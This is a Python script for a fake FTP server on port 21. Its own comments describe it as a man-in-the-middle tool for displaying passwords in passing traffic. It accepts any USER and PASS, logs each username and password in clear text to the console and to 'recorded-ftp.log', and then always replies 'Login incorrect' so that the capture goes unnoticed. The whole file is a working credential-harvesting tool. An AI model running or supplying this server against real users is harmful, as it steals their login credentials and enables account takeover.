#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
# DO NOT USE IT IN PRODUCTION
# This one is used for display the password in the traffic which passed it
# working as a medium man.
#
# Due to working mechanism, you may need root privileges to bind.
#

import logging
import os
import socket
import sys
import threading

logging.basicConfig(format="%(asctime)s - %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Bind Port need root privileges
logger.info("Check Root Privileges...")
try:
    assert os.getuid() == 0
except AssertionError:
    logger.error("Need Root Privileges to bind on port 21.")
    sys.exit(-1)

# Constant

HOST = "0.0.0.0"
logger.critical("Bind on Port 21, NOT SUPPORT FOR FILE TRANSFER...")
logger.critical("Just logged user credentials, DO NOT USE IT IN PRODUCTION")
PORT = 21  # FTP Out-of-band transmission: 21 for Control, 20 for File Transfer
CWD = os.getcwd()  # Default Working Folder


class FTPServ(threading.Thread):
    def __init__(self, commSocket, address):
        threading.Thread.__init__(self)
        self.username = None
        self.password = None
        self.authenticated = False
        self.ctrlSock = commSocket
        self.addr = address

    def __del__(self):
        with open("recorded-ftp.log", "a") as f:
            data = str(self.addr) + " | " + str(self.username) + ":" + str(self.password) + "\n"
            f.write(data)

    # --- Basic Transfer ---
    def sendCtrl(self, data):
        self.ctrlSock.send(data.encode('utf-8'))

    # --- FTP Command Implement ---
    def AUTH(self, param):
        self.sendCtrl("530 Please login with USER AND PASS.\r\n")

    def USER(self, usrnm):
        if not usrnm:
            self.sendCtrl("501 Syntax Error. in parameters or arguments.\r\n")
        else:
            logger.info("Username: ** " + usrnm + " ** Logged in.")
            self.username = usrnm
            self.sendCtrl("331 Please specify the password. \r\n")

    def PASS(self, passwd):
        if not passwd:
            self.sendCtrl("501 Syntax Error. in parameters or arguments.\r\n")
        elif not self.username:
            self.sendCtrl('503 Bad sequence of commands.\r\n')
        else:
            self.password = passwd
            self.authenticated = True
            logger.info("Password: ** " + passwd + " ** Logged in.")
            self.sendCtrl("530 Login incorrect. \r\n")

    def SYST(self, arg):
        self.sendCtrl("215 {currentos} type.\r\n".format(currentos=sys.platform))

    def QUIT(self, arg):
        self.sendCtrl("221 Goodbye.\r\n")

    # --- Unrelated Function ---
    def sendWelcome(self):
        self.sendCtrl("220 Welcome to My FTP.\r\n")

    # --- Single Thread ---
    def run(self):
        self.sendWelcome()
        while True:
            data = self.ctrlSock.recv(1024).rstrip()
            try:
                cmd = data.decode('utf-8')
                if not cmd:
                    break
            except AttributeError:
                cmd = data
            except socket.error as err:
                logger.error("Error Occurred!")
                logger.error(err)

            try:
                cmd, args = cmd[:4].strip().upper(), cmd[4:].strip() or None
                logger.info("Receving Command: " + str(cmd))
                func = getattr(self, cmd)
                func(args)
            except AttributeError as err:
                self.sendCtrl("500 Syntax Error, Command Unrecognized. \r\n")
                logger.error("Error Occurred: ")
                logger.error(err)


def serverListener():
    global listen_sock
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind((HOST, PORT))
    listen_sock.listen(5)

    logger.info("Server started.")
    while True:
        conn, addr = listen_sock.accept()
        f = FTPServ(conn, addr)
        f.start()
        logger.info("Accepted: Created Connection to: {ad}".format(ad=str(addr)))


if __name__ == '__main__':
    logger.info("Program started to run.")
    try:
        server = threading.Thread(target=serverListener())
        server.start()
    except KeyboardInterrupt:
        logger.info("Server exit.")
        os.system("chown 1000:1000 recorded-ftp.log")
        sys.exit(0)
